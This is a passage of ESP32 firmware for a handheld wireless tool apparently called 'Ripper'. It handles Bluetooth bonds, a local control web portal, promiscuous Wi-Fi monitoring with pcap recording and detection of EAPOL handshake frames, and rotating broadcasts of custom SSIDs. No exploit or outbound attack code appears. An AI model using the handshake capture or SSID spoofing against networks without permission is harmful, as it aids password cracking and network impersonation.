void open_wifi(lv_event_t *e) {
#if RIPPER_SAFE_HOME_RECOVERY
  (void)e;
  Serial.println("SAFE RECOVERY: Wi-Fi screen held");
  return;
#endif
  if (wifi_screen == NULL) create_wifi_screen();
  if (!wifi_saved_connection_attempted) {
    wifi_saved_connection_attempted = true;
    wifi_preferences.begin("ripper-wifi", true);
    String saved_ssid = wifi_preferences.getString("ssid", "");
    String saved_password = wifi_preferences.getString("password", "");
    wifi_preferences.end();
    if (saved_ssid.length() > 0) {
      if (wifi_enter_operating_state(WIFI_OP_STA_CONNECTING))
        WiFi.begin(saved_ssid.c_str(), saved_password.c_str());
    }
  }
  lv_scr_load(wifi_screen);
  set_status(wifi_operating_state == WIFI_OP_STA_CONNECTING ? "CONNECTING" : "SYSTEM READY",
             wifi_operating_state == WIFI_OP_STA_CONNECTING ? COLOR_SETTINGS : COLOR_READY);
}


void open_ble(lv_event_t *e) {
#if RIPPER_SAFE_HOME_RECOVERY
  (void)e;
  Serial.println("SAFE RECOVERY: BLE screen held");
  return;
#endif
  if (ble_screen == NULL) create_ble_screen();
  lv_scr_load(ble_screen);
  set_status("SYSTEM READY", COLOR_READY);
}


void open_bluetooth_from_ble(lv_event_t *e) {
  bluetooth_opened_from_ble = true;
  lv_scr_load(bluetooth_screen);
  refresh_bluetooth_screen();
  set_status("SYSTEM READY", COLOR_READY);
}


void bluetooth_return(lv_event_t *e) {
  if (bluetooth_opened_from_ble && ble_screen != NULL) {
    lv_scr_load(ble_screen);
  } else {
    lv_scr_load(settings_screen);
  }
  set_status("SYSTEM READY", COLOR_READY);
}


void open_bluetooth_bonds(lv_event_t *e) {
  if (bluetooth_bonds_screen == NULL) create_bluetooth_bonds_screen();
  bluetooth_selected_bond = -1;
  refresh_bluetooth_bonds_screen();
  lv_scr_load(bluetooth_bonds_screen);
  set_status("SYSTEM READY", COLOR_READY);
}


void bluetooth_bonds_return(lv_event_t *e) {
  lv_scr_load(ble_screen);
  set_status("SYSTEM READY", COLOR_READY);
}


void refresh_bluetooth_bonds_screen() {
  if (bluetooth_bonds_label == NULL) return;

  for (uint8_t i = 0; i < MAX_BLUETOOTH_BOND_ROWS; i++) {
    if (bluetooth_bond_rows[i] != NULL) lv_obj_add_flag(bluetooth_bond_rows[i], LV_OBJ_FLAG_HIDDEN);
  }

  if (!ble_stack_initialized) {
    lv_label_set_text(bluetooth_bonds_label,
                      "BLUETOOTH IS NOT AVAILABLE");
    if (bluetooth_forget_selected_button != NULL) {
      lv_obj_add_flag(bluetooth_forget_selected_button, LV_OBJ_FLAG_HIDDEN);
    }
    return;
  }

  const int bond_count = NimBLEDevice::getNumBonds();
  if (bond_count <= 0) {
    bluetooth_selected_bond = -1;
    lv_label_set_text(bluetooth_bonds_label,
                      "NO REMEMBERED DEVICES");
    if (bluetooth_forget_selected_button != NULL) {
      lv_obj_add_flag(bluetooth_forget_selected_button, LV_OBJ_FLAG_HIDDEN);
    }
    return;
  }

  if (bluetooth_selected_bond >= bond_count) bluetooth_selected_bond = bond_count - 1;

  if (bluetooth_forget_selected_button != NULL) {
    if (bluetooth_selected_bond >= 0) {
      lv_obj_clear_flag(bluetooth_forget_selected_button, LV_OBJ_FLAG_HIDDEN);
    } else {
      lv_obj_add_flag(bluetooth_forget_selected_button, LV_OBJ_FLAG_HIDDEN);
    }
  }

  lv_label_set_text_fmt(bluetooth_bonds_label, "%d REMEMBERED DEVICE%s",
                        bond_count, bond_count == 1 ? "" : "S");
  const int displayed = min(bond_count, (int)MAX_BLUETOOTH_BOND_ROWS);
  for (int i = 0; i < displayed; i++) {
    NimBLEAddress address = NimBLEDevice::getBondedAddress(i);
    lv_label_set_text_fmt(bluetooth_bond_number_labels[i], "DEVICE %d", i + 1);
    lv_label_set_text(bluetooth_bond_address_labels[i], address.toString().c_str());
    lv_obj_set_style_bg_color(bluetooth_bond_rows[i],
                              lv_color_hex(i == bluetooth_selected_bond ? COLOR_PANEL2 : 0x090F16),
                              LV_PART_MAIN);
    lv_obj_set_style_border_color(bluetooth_bond_rows[i],
                                  lv_color_hex(i == bluetooth_selected_bond ? COLOR_BLUETOOTH : 0x344454),
                                  LV_PART_MAIN);
    lv_obj_set_style_border_width(bluetooth_bond_rows[i],
                                  i == bluetooth_selected_bond ? 2 : 1, LV_PART_MAIN);
    lv_obj_clear_flag(bluetooth_bond_rows[i], LV_OBJ_FLAG_HIDDEN);
  }
}


void select_bluetooth_bond_row(lv_event_t *e) {
  const uint8_t row = (uint8_t)(uintptr_t)lv_event_get_user_data(e);
  const int bond_count = ble_stack_initialized ? NimBLEDevice::getNumBonds() : 0;
  if (row >= bond_count) return;
  bluetooth_selected_bond = row;
  refresh_bluetooth_bonds_screen();
}


void bluetooth_previous_bond(lv_event_t *e) {
  const int bond_count = ble_stack_initialized ? NimBLEDevice::getNumBonds() : 0;
  if (bond_count <= 0) return;
  bluetooth_selected_bond = bluetooth_selected_bond < 0 ? bond_count - 1 :
                            (bluetooth_selected_bond + bond_count - 1) % bond_count;
  refresh_bluetooth_bonds_screen();
}


void bluetooth_next_bond(lv_event_t *e) {
  const int bond_count = ble_stack_initialized ? NimBLEDevice::getNumBonds() : 0;
  if (bond_count <= 0) return;
  bluetooth_selected_bond = bluetooth_selected_bond < 0 ? 0 :
                            (bluetooth_selected_bond + 1) % bond_count;
  refresh_bluetooth_bonds_screen();
}


void request_bluetooth_forget(lv_event_t *e) {
  const int bond_count = ble_stack_initialized ? NimBLEDevice::getNumBonds() : 0;
  if (bond_count <= 0 || bluetooth_selected_bond < 0 ||
      bluetooth_selected_bond >= bond_count) return;

  bluetooth_forget_address = NimBLEDevice::getBondedAddress(bluetooth_selected_bond);
  if (bluetooth_forget_confirm_screen == NULL) create_bluetooth_forget_confirm_screen();
  lv_label_set_text_fmt(bluetooth_forget_confirm_label,
                        "FORGET DEVICE %d?\n\n%s\n\nIt must pair again before\nit can reconnect.",
                        bluetooth_selected_bond + 1,
                        bluetooth_forget_address.toString().c_str());
  lv_scr_load(bluetooth_forget_confirm_screen);
}


void confirm_bluetooth_forget(lv_event_t *e) {
  const std::string address_text = bluetooth_forget_address.toString();
  const bool deleted = ble_stack_initialized &&
                       NimBLEDevice::deleteBond(bluetooth_forget_address);
  Serial.printf("Bluetooth forget %s: %s\n", address_text.c_str(),
                deleted ? "success" : "failed");
  if (deleted) {
    const int remaining = NimBLEDevice::getNumBonds();
    bluetooth_selected_bond = -1;
    refresh_connection_indicators();
    refresh_bluetooth_screen();
  }
  refresh_bluetooth_bonds_screen();
  lv_scr_load(bluetooth_bonds_screen);
}


void cancel_bluetooth_forget(lv_event_t *e) {
  refresh_bluetooth_bonds_screen();
  lv_scr_load(bluetooth_bonds_screen);
}


void wifi_feature_info(lv_event_t *e) {
  if (wifi_info_label != NULL) {
    lv_label_set_text(wifi_info_label,
                      "Wi-Fi scan and your-network device\nview are the next safe tools to add.");
  }
  set_status("SYSTEM READY", COLOR_READY);
}


void record_wifi_event(uint8_t kind, const uint8_t *mac, int8_t rssi, uint8_t channel) {
  portENTER_CRITICAL(&wifi_events_lock);
  const uint8_t index = wifi_event_write % WIFI_EVENT_HISTORY_SIZE;
  WifiEventRecord &event = wifi_event_history[index];
  event.time_ms = millis();
  event.kind = kind;
  event.rssi = rssi;
  event.channel = channel;
  if (mac != NULL) memcpy(event.mac, mac, 6); else memset(event.mac, 0, 6);
  wifi_event_write = (wifi_event_write + 1) % WIFI_EVENT_HISTORY_SIZE;
  wifi_event_total++;
  portEXIT_CRITICAL(&wifi_events_lock);
}


int64_t days_from_civil(int year, unsigned month, unsigned day) {
  year -= month <= 2;
  const int era = (year >= 0 ? year : year - 399) / 400;
  const unsigned yoe = (unsigned)(year - era * 400);
  const unsigned doy = (153 * (month + (month > 2 ? -3 : 9)) + 2) / 5 + day - 1;
  const unsigned doe = yoe * 365 + yoe / 4 - yoe / 100 + doy;
  return era * 146097LL + (int)doe - 719468LL;
}


uint64_t wifi_rtc_epoch_seconds() {
  if (!rtc_ready || !rtc.isClockIntegrityGuaranteed()) return 0;
  RTC_DateTime now = rtc.getDateTime();
  const int64_t days = days_from_civil(now.getYear(), now.getMonth(), now.getDay());
  if (days < 0) return 0;
  return (uint64_t)days * 86400ULL + now.getHour() * 3600ULL + now.getMinute() * 60ULL + now.getSecond();
}


void begin_wifi_capture_clock() {
  wifi_capture_epoch_us = wifi_rtc_epoch_seconds() * 1000000ULL;
  wifi_capture_monotonic_us = 0;
  wifi_capture_last_micros32 = micros();
}


uint64_t wifi_capture_timestamp_us() {
  const uint32_t now32 = micros();
  const uint32_t elapsed = now32 - wifi_capture_last_micros32;
  wifi_capture_last_micros32 = now32;
  wifi_capture_monotonic_us += elapsed;
  return wifi_capture_epoch_us + wifi_capture_monotonic_us;
}


void wifi_promiscuous_receive(void *buffer, wifi_promiscuous_pkt_type_t type) {
  if (!wifi_monitor_running || buffer == NULL || type == WIFI_PKT_MISC) return;
  wifi_promiscuous_pkt_t *packet = (wifi_promiscuous_pkt_t *)buffer;
  const uint16_t length = packet->rx_ctrl.sig_len;
  if (length < 2) return;
  const uint8_t *frame = packet->payload;
  const uint16_t frame_control = frame[0] | ((uint16_t)frame[1] << 8);
  const uint8_t frame_type = (frame_control >> 2) & 0x03;
  const uint8_t frame_subtype = (frame_control >> 4) & 0x0f;
  const bool to_ds = (frame_control & 0x0100) != 0;
  const bool from_ds = (frame_control & 0x0200) != 0;
  const bool protected_frame = (frame_control & 0x4000) != 0;
  wifi_packet_count++;
  if (packet->rx_ctrl.channel >= 1 && packet->rx_ctrl.channel <= 13)
    wifi_channel_packet_counts[packet->rx_ctrl.channel - 1]++;
  wifi_last_packet_rssi = packet->rx_ctrl.rssi;
  if (length >= 16) {
    const uint8_t *source = NULL;
    if (frame_type == 2) {
      if (!to_ds && !from_ds) source = frame + 10;       // IBSS/direct transmitter
      else if (to_ds && !from_ds) source = frame + 10;   // station -> AP
      else if (!to_ds && from_ds) source = frame + 4;    // AP -> destination station
      else source = NULL;                                // WDS has no unambiguous AP client
    } else if (frame_type == 0 &&
               (frame_subtype == 0 || frame_subtype == 2 || frame_subtype == 4 || frame_subtype == 11)) {
      source = frame + 10;
    }
    if (source != NULL) {
    portENTER_CRITICAL(&wifi_clients_lock);
    if ((source[0] & 0x01) == 0 && memcmp(source, "\0\0\0\0\0\0", 6) != 0) {
      int8_t client_index = -1;
      for (uint8_t i = 0; i < wifi_observed_client_count; i++) {
        if (memcmp(wifi_observed_clients[i].mac, source, 6) == 0) {
          client_index = i;
          break;
        }
      }
      if (client_index < 0 && wifi_observed_client_count < WIFI_OBSERVED_CLIENTS)
        client_index = wifi_observed_client_count++;
      if (client_index >= 0) {
        WifiObservedClient &client = wifi_observed_clients[client_index];
        memcpy(client.mac, source, 6);
        client.rssi = packet->rx_ctrl.rssi;
        client.channel = packet->rx_ctrl.channel;
        client.last_seen_ms = millis();
        client.packets++;
      }
    }
    portEXIT_CRITICAL(&wifi_clients_lock);
    }
  }
  if (frame_type == 0 && frame_subtype == 11) {
    wifi_auth_count++;
    record_wifi_event(1, length >= 16 ? frame + 10 : NULL, packet->rx_ctrl.rssi, packet->rx_ctrl.channel);
  }
  if (frame_type == 0 && (frame_subtype == 0 || frame_subtype == 1 || frame_subtype == 2 || frame_subtype == 3)) {
    wifi_assoc_count++;
    record_wifi_event(2, length >= 16 ? frame + 10 : NULL, packet->rx_ctrl.rssi, packet->rx_ctrl.channel);
  }
  if (frame_type == 0 && (frame_subtype == 10 || frame_subtype == 12)) {
    wifi_deauth_count++;
    record_wifi_event(3, length >= 16 ? frame + 10 : NULL, packet->rx_ctrl.rssi, packet->rx_ctrl.channel);
  }
  if (frame_type == 2 && !protected_frame) {
    uint16_t header_length = 24;
    if (to_ds && from_ds) header_length += 6;
    const bool qos_data = (frame_subtype & 0x08) != 0;
    if (qos_data) header_length += 2;
    if (qos_data && (frame_control & 0x8000)) header_length += 4;
    if (length >= header_length + 8) {
      const uint8_t *llc = frame + header_length;
      const bool snap = llc[0] == 0xAA && llc[1] == 0xAA && llc[2] == 0x03 &&
                        llc[3] == 0x00 && llc[4] == 0x00 && llc[5] == 0x00;
      const uint16_t ether_type = ((uint16_t)llc[6] << 8) | llc[7];
      if (snap && ether_type == 0x888E) {
        wifi_eapol_count++;
        const uint8_t *event_mac = (to_ds && !from_ds) ? frame + 10 :
                                   (!to_ds && from_ds) ? frame + 4 : frame + 10;
        record_wifi_event(4, event_mac, packet->rx_ctrl.rssi, packet->rx_ctrl.channel);
      }
    }
  }
  if (wifi_pcap_recording) {
    portENTER_CRITICAL(&wifi_capture_lock);
    const uint8_t next = (wifi_capture_write + 1) % WIFI_CAPTURE_QUEUE_SIZE;
    if (next != wifi_capture_read) {
      WifiCaptureSlot &slot = wifi_capture_queue[wifi_capture_write];
      slot.timestamp_us = wifi_capture_timestamp_us();
      slot.length = min((uint16_t)sizeof(slot.data), length);
      slot.rssi = packet->rx_ctrl.rssi;
      memcpy(slot.data, frame, slot.length);
      wifi_capture_write = next;
    } else wifi_capture_dropped_packets++;
    portEXIT_CRITICAL(&wifi_capture_lock);
  }
}


void start_wifi_monitor(bool hop_channels) {
  if (!wifi_enter_operating_state(WIFI_OP_MONITOR)) return;
  wifi_packet_count = wifi_auth_count = wifi_assoc_count = 0;
  wifi_deauth_count = wifi_eapol_count = 0;
  portENTER_CRITICAL(&wifi_clients_lock);
  wifi_observed_client_count = 0;
  memset(wifi_observed_clients, 0, sizeof(wifi_observed_clients));
  portEXIT_CRITICAL(&wifi_clients_lock);
  memset((void *)wifi_channel_packet_counts, 0, sizeof(wifi_channel_packet_counts));
  wifi_monitor_channel = 1;
  wifi_channel_hopping = hop_channels;
  esp_wifi_set_channel(wifi_monitor_channel, WIFI_SECOND_CHAN_NONE);
  esp_wifi_set_promiscuous_rx_cb(wifi_promiscuous_receive);
  esp_wifi_set_promiscuous(true);
  wifi_monitor_running = true;
  wifi_next_channel_ms = millis() + 450;
  set_status("LISTENING", COLOR_GREEN);
}


void stop_wifi_monitor() {
  esp_wifi_set_promiscuous(false);
  wifi_monitor_running = false;
  wifi_channel_hopping = false;
  if (wifi_operating_state == WIFI_OP_MONITOR)
    wifi_operating_state = WiFi.status() == WL_CONNECTED ? WIFI_OP_STA_CONNECTED : WIFI_OP_IDLE;
  set_status("SYSTEM READY", COLOR_READY);
}


void write_wifi_pcap_header(File &file) {
  const uint32_t magic = 0xa1b2c3d4;
  const uint16_t major = 2, minor = 4;
  const int32_t zone = 0;
  const uint32_t sigfigs = 0, snaplen = 256, linktype = 105;
  file.write((const uint8_t *)&magic, sizeof(magic));
  file.write((const uint8_t *)&major, sizeof(major));
  file.write((const uint8_t *)&minor, sizeof(minor));
  file.write((const uint8_t *)&zone, sizeof(zone));
  file.write((const uint8_t *)&sigfigs, sizeof(sigfigs));
  file.write((const uint8_t *)&snaplen, sizeof(snaplen));
  file.write((const uint8_t *)&linktype, sizeof(linktype));
}


bool start_wifi_pcap() {
  if (!sd_card_ready) return false;
  char capture_path[40];
  snprintf(capture_path, sizeof(capture_path), "/wifi_capture_%lu.pcap", millis());
  wifi_pcap_file = SD_MMC.open(capture_path, FILE_WRITE);
  if (!wifi_pcap_file) return false;
  write_wifi_pcap_header(wifi_pcap_file);
  portENTER_CRITICAL(&wifi_capture_lock);
  wifi_capture_read = wifi_capture_write = 0;
  wifi_capture_dropped_packets = 0;
  portEXIT_CRITICAL(&wifi_capture_lock);
  begin_wifi_capture_clock();
  wifi_pcap_recording = true;
  start_wifi_monitor(true);
  if (wifi_monitor_running) set_status("RECORDING", COLOR_SAVED);
  return true;
}


void stop_wifi_pcap() {
  wifi_pcap_recording = false;
  if (wifi_pcap_file) {
    wifi_pcap_file.flush();
    wifi_pcap_file.close();
  }
  stop_wifi_monitor();
}


void service_wifi_capture_queue() {
  while (wifi_pcap_file) {
    WifiCaptureSlot slot = {};
    bool have_slot = false;
    portENTER_CRITICAL(&wifi_capture_lock);
    if (wifi_capture_read != wifi_capture_write) {
      slot = wifi_capture_queue[wifi_capture_read];
      wifi_capture_read = (wifi_capture_read + 1) % WIFI_CAPTURE_QUEUE_SIZE;
      have_slot = true;
    }
    portEXIT_CRITICAL(&wifi_capture_lock);
    if (!have_slot) break;
    const uint32_t seconds = (uint32_t)(slot.timestamp_us / 1000000ULL);
    const uint32_t microseconds = (uint32_t)(slot.timestamp_us % 1000000ULL);
    const uint32_t captured = slot.length;
    wifi_pcap_file.write((const uint8_t *)&seconds, 4);
    wifi_pcap_file.write((const uint8_t *)&microseconds, 4);
    wifi_pcap_file.write((const uint8_t *)&captured, 4);
    wifi_pcap_file.write((const uint8_t *)&captured, 4);
    wifi_pcap_file.write(slot.data, slot.length);
  }
}


void wifi_web_root() {
  String page = "<html><meta name='viewport' content='width=device-width'><style>body{background:#071015;color:#dff;font-family:sans-serif;padding:18px}a,button,input{display:block;box-sizing:border-box;width:100%;background:#10242b;color:#dff;border:1px solid #2cc;padding:14px;margin:10px 0;text-decoration:none;border-radius:8px}</style>"
                "<body><h2>Ripper Wi-Fi</h2><p>Local control and diagnostics</p>";
  if (wifi_setup_portal_active)
    page += "<h3>Connect Ripper to your Wi-Fi</h3><form method='POST' action='/configure'><input name='ssid' maxlength='32' placeholder='Network name'><input name='password' maxlength='63' type='password' placeholder='Password'><button type='submit'>Save and connect</button></form><p>These details configure this Ripper only.</p>";
  page += "<a href='/status'>Device status</a><a href='/networks'>Nearby networks</a><a href='/events'>Wi-Fi events</a><a href='/captures'>Saved captures</a></body></html>";
  wifi_web_server.send(200, "text/html", page);
}


void wifi_web_status() {
  String status = "{\"device\":\"Ripper\",\"packets\":" + String(wifi_packet_count) +
                  ",\"channel\":" + String(wifi_monitor_channel) + "}";
  wifi_web_server.send(200, "application/json", status);
}


String wifi_json_escape(const char *value) {
  String escaped;
  if (value == NULL) return escaped;
  for (const char *p = value; *p != '\0'; ++p) {
    if (*p == '"' || *p == '\\') escaped += '\\';
    if ((uint8_t)*p >= 0x20) escaped += *p;
  }
  return escaped;
}


void wifi_web_networks() {
  String json = "{\"networks\":[";
  for (uint8_t i = 0; i < wifi_result_count; i++) {
    if (i) json += ',';
    json += "{\"ssid\":\"" + wifi_json_escape(wifi_results[i].ssid) + "\",\"bssid\":\"" +
            wifi_json_escape(wifi_results[i].bssid) + "\",\"channel\":" + String(wifi_results[i].channel) +
            ",\"rssi\":" + String(wifi_results[i].rssi) + "}";
  }
  json += "]}";
  wifi_web_server.send(200, "application/json", json);
}


void wifi_web_events() {
  String json = "{\"events\":[";
  WifiEventRecord events[WIFI_EVENT_HISTORY_SIZE] = {};
  uint32_t event_total_snapshot = 0;
  uint8_t event_write_snapshot = 0;
  portENTER_CRITICAL(&wifi_events_lock);
  event_total_snapshot = wifi_event_total;
  event_write_snapshot = wifi_event_write;
  memcpy(events, wifi_event_history, sizeof(events));
  portEXIT_CRITICAL(&wifi_events_lock);
  const uint8_t available = event_total_snapshot > WIFI_EVENT_HISTORY_SIZE ? WIFI_EVENT_HISTORY_SIZE : event_total_snapshot;
  for (uint8_t row = 0; row < available; row++) {
    if (row) json += ',';
    const uint8_t index = (event_write_snapshot + WIFI_EVENT_HISTORY_SIZE - 1 - row) % WIFI_EVENT_HISTORY_SIZE;
    WifiEventRecord &event = events[index];
    json += "{\"time_ms\":" + String(event.time_ms) + ",\"kind\":" + String(event.kind) +
            ",\"channel\":" + String(event.channel) + ",\"rssi\":" + String(event.rssi) + "}";
  }
  json += "]}";
  wifi_web_server.send(200, "application/json", json);
}


void wifi_web_captures() {
  String html = "<html><meta name='viewport' content='width=device-width'><body><h2>Saved Wi-Fi files</h2>";
  if (sd_card_ready) {
    File root = SD_MMC.open("/");
    File entry = root.openNextFile();
    while (entry) {
      if (strstr(entry.name(), "wifi_") != NULL) html += "<p>" + String(entry.name()) + " - " + String(entry.size()) + " bytes</p>";
      entry.close();
      entry = root.openNextFile();
    }
    root.close();
  } else html += "<p>No microSD card detected.</p>";
  html += "</body></html>";
  wifi_web_server.send(200, "text/html", html);
}


void wifi_web_configure() {
  if (!wifi_setup_portal_active || !wifi_web_server.hasArg("ssid")) {
    wifi_web_server.send(403, "text/plain", "Setup portal is not active.");
    return;
  }
  String ssid = wifi_web_server.arg("ssid");
  String password = wifi_web_server.arg("password");
  if (ssid.length() == 0 || ssid.length() > 32 || password.length() > 63) {
    wifi_web_server.send(400, "text/plain", "Invalid network details.");
    return;
  }
  wifi_preferences.begin("ripper-wifi", false);
  wifi_preferences.putString("ssid", ssid);
  wifi_preferences.putString("password", password);
  wifi_preferences.end();
  wifi_web_server.send(200, "text/html", "<html><body><h2>Saved</h2><p>Ripper is connecting to your network.</p></body></html>");
  if (wifi_enter_operating_state(WIFI_OP_AP_STA_WEB))
    WiFi.begin(ssid.c_str(), password.c_str());
}


const char *wifi_control_password() {
  if (wifi_control_ap_password[0] != '\0') return wifi_control_ap_password;
  wifi_preferences.begin("ripper-ap", false);
  String saved = wifi_preferences.getString("password", "");
  if (saved.length() < 8 || saved.length() >= sizeof(wifi_control_ap_password)) {
    snprintf(wifi_control_ap_password, sizeof(wifi_control_ap_password), "R%08lX", (unsigned long)esp_random());
    wifi_preferences.putString("password", wifi_control_ap_password);
  } else {
    strlcpy(wifi_control_ap_password, saved.c_str(), sizeof(wifi_control_ap_password));
  }
  wifi_preferences.end();
  return wifi_control_ap_password;
}


void start_wifi_ap_services(bool portal) {
  if (!wifi_enter_operating_state(WIFI_OP_AP_WEB)) return;
  if (!WiFi.softAP(portal ? "Ripper-Setup" : "Ripper-Control", wifi_control_password())) {
    Serial.println("Could not start protected Ripper control AP.");
    return;
  }
  if (!wifi_web_service_running) {
    wifi_web_server.on("/", wifi_web_root);
    wifi_web_server.on("/status", wifi_web_status);
    wifi_web_server.on("/networks", wifi_web_networks);
    wifi_web_server.on("/events", wifi_web_events);
    wifi_web_server.on("/captures", wifi_web_captures);
    wifi_web_server.on("/configure", HTTP_POST, wifi_web_configure);
    wifi_web_server.onNotFound(wifi_web_root);
    wifi_web_server.begin();
    wifi_web_service_running = true;
  }
  wifi_setup_portal_active = portal;
  if (portal) wifi_dns_server.start(53, "*", WiFi.softAPIP());
  wifi_ap_service_running = true;
  set_status("SERVING", COLOR_GREEN);
}


void stop_wifi_ap_services() {
  if (!wifi_ap_service_running) return;
  wifi_dns_server.stop();
  wifi_web_server.stop();
  WiFi.softAPdisconnect(true);
  wifi_ap_service_running = false;
  wifi_web_service_running = false;
  wifi_setup_portal_active = false;
  if (wifi_operating_state == WIFI_OP_AP_WEB || wifi_operating_state == WIFI_OP_AP_STA_WEB)
    wifi_operating_state = WiFi.status() == WL_CONNECTED ? WIFI_OP_STA_CONNECTED : WIFI_OP_IDLE;
  set_status("SYSTEM READY", COLOR_READY);
}


uint8_t wifi_custom_ssid_selected_count() {
  uint8_t total = 0;
  for (uint8_t i = 0; i < wifi_custom_ssid_count; i++)
    if (wifi_custom_ssid_selected[i] && wifi_custom_ssids[i][0] != '\0') total++;
  return total;
}


void load_wifi_custom_ssids() {
  wifi_preferences.begin("ripper-ssids", true);
  wifi_custom_ssid_count = min((uint8_t)WIFI_CUSTOM_SSID_MAX,
                               wifi_preferences.getUChar("count", 0));
  const uint16_t selected_mask = wifi_preferences.getUShort("selected", 0);
  wifi_custom_ssid_channel = constrain(wifi_preferences.getUChar("channel", 1), 1, 13);
  for (uint8_t i = 0; i < WIFI_CUSTOM_SSID_MAX; i++) {
    char key[5];
    snprintf(key, sizeof(key), "ssid%u", i);
    String name = i < wifi_custom_ssid_count ? wifi_preferences.getString(key, "") : "";
    strlcpy(wifi_custom_ssids[i], name.c_str(), sizeof(wifi_custom_ssids[i]));
    wifi_custom_ssid_selected[i] = i < wifi_custom_ssid_count && (selected_mask & (1U << i));
  }
  wifi_preferences.end();
}


void save_wifi_custom_ssids() {
  uint16_t selected_mask = 0;
  wifi_preferences.begin("ripper-ssids", false);
  wifi_preferences.putUChar("count", wifi_custom_ssid_count);
  wifi_preferences.putUChar("channel", wifi_custom_ssid_channel);
  for (uint8_t i = 0; i < WIFI_CUSTOM_SSID_MAX; i++) {
    char key[5];
    snprintf(key, sizeof(key), "ssid%u", i);
    wifi_preferences.putString(key, i < wifi_custom_ssid_count ? wifi_custom_ssids[i] : "");
    if (i < wifi_custom_ssid_count && wifi_custom_ssid_selected[i]) selected_mask |= 1U << i;
  }
  wifi_preferences.putUShort("selected", selected_mask);
  wifi_preferences.end();
}


void refresh_wifi_custom_ssid_screen() {
  if (wifi_custom_ssid_list == NULL) return;
  lv_obj_clean(wifi_custom_ssid_list);
  for (uint8_t i = 0; i < wifi_custom_ssid_count; i++) {
    char row[48];
    snprintf(row, sizeof(row), "%s  %u. %s",
             wifi_custom_ssid_selected[i] ? "[X]" : "[ ]", i + 1, wifi_custom_ssids[i]);
    lv_obj_t *button = create_button(wifi_custom_ssid_list, 2, 2 + i * 40, 278, 36,
                                     row, wifi_custom_ssid_selected[i] ? COLOR_GREEN : COLOR_SETTINGS, NULL);
    lv_obj_add_event_cb(button, [](lv_event_t *e) {
      const uint8_t index = (uint8_t)(uintptr_t)lv_event_get_user_data(e);
      if (index >= wifi_custom_ssid_count || wifi_custom_ssid_running) return;
      wifi_custom_ssid_edit_index = index;
      wifi_custom_ssid_selected[index] = !wifi_custom_ssid_selected[index];
      char updated_row[48];
      snprintf(updated_row, sizeof(updated_row), "%s  %u. %s",
               wifi_custom_ssid_selected[index] ? "[X]" : "[ ]", index + 1,
               wifi_custom_ssids[index]);
      lv_label_set_text(lv_obj_get_child(lv_event_get_target(e), 0), updated_row);
      lv_label_set_text_fmt(wifi_custom_ssid_count_label, "%u SELECTED",
                            wifi_custom_ssid_selected_count());
    }, LV_EVENT_CLICKED, (void *)(uintptr_t)i);
  }
  if (wifi_custom_ssid_count == 0) {
    lv_obj_t *empty = lv_label_create(wifi_custom_ssid_list);
    lv_label_set_text(empty, "No names saved. Tap ADD.");
    lv_obj_set_style_text_color(empty, lv_color_hex(COLOR_MUTED), LV_PART_MAIN);
    lv_obj_center(empty);
  }
  if (wifi_custom_ssid_count_label != NULL)
    lv_label_set_text_fmt(wifi_custom_ssid_count_label, "%u SELECTED", wifi_custom_ssid_selected_count());
  if (wifi_custom_ssid_channel_label != NULL)
    lv_label_set_text_fmt(wifi_custom_ssid_channel_label, "CHANNEL %u", wifi_custom_ssid_channel);
  if (wifi_custom_ssid_status_label != NULL) {
    if (wifi_custom_ssid_running)
      lv_label_set_text_fmt(wifi_custom_ssid_status_label, "ACTIVE  |  %u selected  |  showing: %s",
                            wifi_custom_ssid_selected_count(), wifi_custom_ssids[wifi_custom_ssid_active_index]);
    else
      lv_label_set_text(wifi_custom_ssid_status_label, "STOPPED  |  Tap a row to select it and include/exclude it.");
    lv_obj_set_style_text_color(wifi_custom_ssid_status_label,
                                lv_color_hex(wifi_custom_ssid_running ? COLOR_GREEN : COLOR_MUTED), LV_PART_MAIN);
  }
}


void stop_wifi_custom_ssids() {
  if (!wifi_custom_ssid_running && wifi_operating_state != WIFI_OP_CUSTOM_SSIDS) return;
  WiFi.softAPdisconnect(true);
  wifi_custom_ssid_running = false;
  wifi_custom_ssid_next_rotate_ms = 0;
  if (wifi_operating_state == WIFI_OP_CUSTOM_SSIDS) {
    WiFi.mode(WIFI_STA);
    wifi_operating_state = WIFI_OP_IDLE;
  }
  set_status("SYSTEM READY", COLOR_READY);
  refresh_wifi_custom_ssid_screen();
}


bool advertise_wifi_custom_ssid(uint8_t index) {
  if (index >= wifi_custom_ssid_count || !wifi_custom_ssid_selected[index] || wifi_custom_ssids[index][0] == '\0')
    return false;
  WiFi.softAPdisconnect(false);
  if (!WiFi.softAP(wifi_custom_ssids[index], NULL, wifi_custom_ssid_channel, false, 1)) return false;
  wifi_custom_ssid_active_index = index;
  wifi_custom_ssid_next_rotate_ms = millis() + WIFI_CUSTOM_SSID_ROTATE_MS;
  return true;
}


void service_wifi_custom_ssids() {
  if (!wifi_custom_ssid_running || wifi_operating_state != WIFI_OP_CUSTOM_SSIDS) return;
  if ((int32_t)(millis() - wifi_custom_ssid_next_rotate_ms) < 0) return;
  for (uint8_t offset = 1; offset <= wifi_custom_ssid_count; offset++) {
    const uint8_t index = (wifi_custom_ssid_active_index + offset) % wifi_custom_ssid_count;
    if (wifi_custom_ssid_selected[index] && advertise_wifi_custom_ssid(index)) break;
  }
  refresh_wifi_custom_ssid_screen();
}


bool wifi_enter_operating_state(WifiOperatingState target) {
  if (wifi_operating_state == target) {
    if ((target == WIFI_OP_STA_CONNECTED || target == WIFI_OP_LAN_DIAGNOSTIC) && WiFi.status() != WL_CONNECTED) {
      wifi_operating_state = WIFI_OP_IDLE;
      return false;
    }
    return true;
  }
  Serial.printf("Wi-Fi state: %s -> %s\n", wifi_operating_state_name(wifi_operating_state),
                wifi_operating_state_name(target));

  if (wifi_scan_active && target != WIFI_OP_SCANNING) {
    WiFi.scanDelete();
    wifi_scan_active = false;
  }
  if (wifi_pcap_recording && target != WIFI_OP_MONITOR) stop_wifi_pcap();
  else if (wifi_monitor_running && target != WIFI_OP_MONITOR) stop_wifi_monitor();
  if (wifi_ap_service_running && target != WIFI_OP_AP_WEB && target != WIFI_OP_AP_STA_WEB)
    stop_wifi_ap_services();
  if (wifi_custom_ssid_running && target != WIFI_OP_CUSTOM_SSIDS) stop_wifi_custom_ssids();
  if (target != WIFI_OP_LAN_DIAGNOSTIC) {
    wifi_host_discovery_running = false;
    if (wifi_ping_handle != NULL) {
      esp_ping_stop(wifi_ping_handle);
      esp_ping_delete_session(wifi_ping_handle);
      wifi_ping_handle = NULL;
    }
  }

  switch (target) {
    case WIFI_OP_STA_CONNECTING:
